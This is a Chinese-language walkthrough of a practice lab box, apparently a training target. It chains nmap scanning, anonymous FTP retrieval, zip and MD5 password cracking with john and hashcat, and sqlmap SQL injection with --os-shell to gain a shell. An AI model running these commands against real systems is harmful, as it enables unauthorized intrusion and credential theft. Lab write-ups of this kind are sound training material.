### 一、操作步骤

1. nmap扫描

```shell
    nmap -A -sV 10.129.194.163
    # 出现端口21、22、80
    # 利用思路：
    #   1. 对ssh服务进行弱口令爆破，无效 
    #   2. 通过信息发现ftp可以匿名登录，发现存在文件`backup.zip`文件
    #   3. 登录10.129.194.163web页面，存在登录界面，尝试万能密码无效。
    #  假设`backup.zip`文件可能存在相关信息，但是需要密码进行解压
```

2. `backup.zip`文件破解

```
john 是一款大受欢迎的、免费的开源软件、基于字典的密码破解工具。用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 DES 、 MD4 、 MD5 等
```

- 利用`zip2john`转换zip文件

```shell
    zip2john backup.zip >> hashs
```

- 使用`john`工具破解密码

```shell
    john hashs  # 获得密码741852963
```

- 解压`backup.zip`文件,发现文件`index.php`和`style.css`

```php
#index.php
session_start();
if(isset($_POST['username']) && isset($_POST['password'])) {
if($_POST['username'] === 'admin' && md5($_POST['password']) ===
"2cb42f8734ea607eefed3b70af13bbd3") {
$_SESSION['login'] = "true";
header("Location: dashboard.php");
```

> 从代码中发现，密码经过md5加密，需要解密

- 使用`hashcat`工具进行解密

```shell
    hashcat -a 0 -m 0 test.txt /usr/share/wordlists/rockyou.txt
    # -a 指定破解模式
    #       0  straight                   字典破解
    #       1  combination                将字典中密码进行组合（1 2>11 22 12 21）
    #       3  brute-force                使用指定掩码破解
    #       6  Hybrid Wordlist + Mask     字典+掩码破解
    #       7  Hybrid Mask  + Wordlist    掩码+字典破解
    # -m 指定哈希类型,0为md5
```

> 直接使用字典爆破，获得密码qwerty789,直接登录web从而进入下一步操作

3. sql注入
-  页面信息收集
```shell
    发现url：http://10.129.194.163/dashboard.php?search=f
    # 输入'发现报错，存在sql注入漏洞
```

- 使用sqlmap工具进行扫描
```shell
     sqlmap -u "http://10.129.194.163/dashboard.php?search=f" --cookie="PHPSESSID=4h3a937f4hobqtlb4v0o3iposd" --os-shell
     # --cookie 设置cookie值,用来进行验证
     # --os-shell 获取shell
     # -u 设置url链接
```
> 至此，我们已经获取webshell,为了保证连接稳定，使用反弹shell获取webshell

### 二、涉及知识点
1. 解密工具：hashcap和john
2. 弱密码
3. sqlmap工具使用


